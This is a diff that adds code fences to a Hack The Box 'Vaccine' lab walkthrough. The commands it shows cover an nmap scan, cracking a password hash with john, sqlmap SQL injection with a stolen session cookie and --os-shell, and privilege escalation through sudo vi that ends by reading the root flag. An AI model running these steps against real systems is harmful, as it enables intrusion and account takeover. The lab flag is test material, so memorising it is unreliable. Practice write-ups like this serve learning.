@@ -1,5 +1,6 @@
 =======================
 1.
+```bash
 ┌──(sabeshan㉿kali)-[~/HTB/startpoint]
 └─$ nmap -sS -A -sV -T4 10.129.95.174 -vv
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 20:31 IST
@@ -122,8 +123,10 @@ Read data files from: /usr/share/nmap
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 46.66 seconds
                     Raw packets sent: 1155 (51.654KB) | Rcvd: 1143 (47.777KB)
+```
 ======================================================================================
 2.Via ftp I was identified the file and crack the file using john;
+```bash
 ┌──(sabeshan㉿kali)-[~/HTB/startpoint]
 └─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt    
 Using default input encoding: UTF-8
@@ -214,11 +217,13 @@ session_start();
   
 </body>
 </html>
+```
 ===================================================================================================
 3. i got the username  admin and cracked the password from the hashes "qwerty789".
 ===================================================================================================
 4.
-    ┌──(sabeshan㉿kali)-[~/HTB/startpoint]
+```bash
+┌──(sabeshan㉿kali)-[~/HTB/startpoint]
 └─$ sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=h6etltu9tqflpa7tlp070f83gk"
         ___
        __H__                                                                                                                                                                                                                   
@@ -278,7 +283,8 @@ back-end DBMS: PostgreSQL
 
 [*] ending @ 20:53:26 /2025-08-19/
 
-                                                                                                                                                                                                                               
+```
+```bash                                                                                                                                                                                                                             
 ┌──(sabeshan㉿kali)-[~/HTB/startpoint]
 └─$ sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=h6etltu9tqflpa7tlp070f83gk" --os-shell
         ___
@@ -321,9 +327,11 @@ do you want to retrieve the command standard output? [Y/n/a] y
 [20:57:23] [CRITICAL] connection timed out to the target URL
 
 [*] ending @ 20:57:23 /2025-08-19/
+```
 ===================================================================================================================
 5.
-  postgres@vaccine:/var/www/html$ cat dashboard.php
+```bash
+postgres@vaccine:/var/www/html$ cat dashboard.php
 <!DOCTYPE html>
 <html lang="en" >
 <head>
@@ -426,9 +434,11 @@ do you want to retrieve the command standard output? [Y/n/a] y
 
 </body>
 </html>
+```
 ======================================================================================================================
 6.
-    postgres@vaccine:~$ sudo -l
+```bash
+postgres@vaccine:~$ sudo -l
 [sudo] password for postgres: 
 Matching Defaults entries for postgres on vaccine:
     env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
@@ -441,3 +451,5 @@ postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
 # cat /root/root.txt
 dd6e058e814260bc70e9bbdef2715849
 # 
+
+```
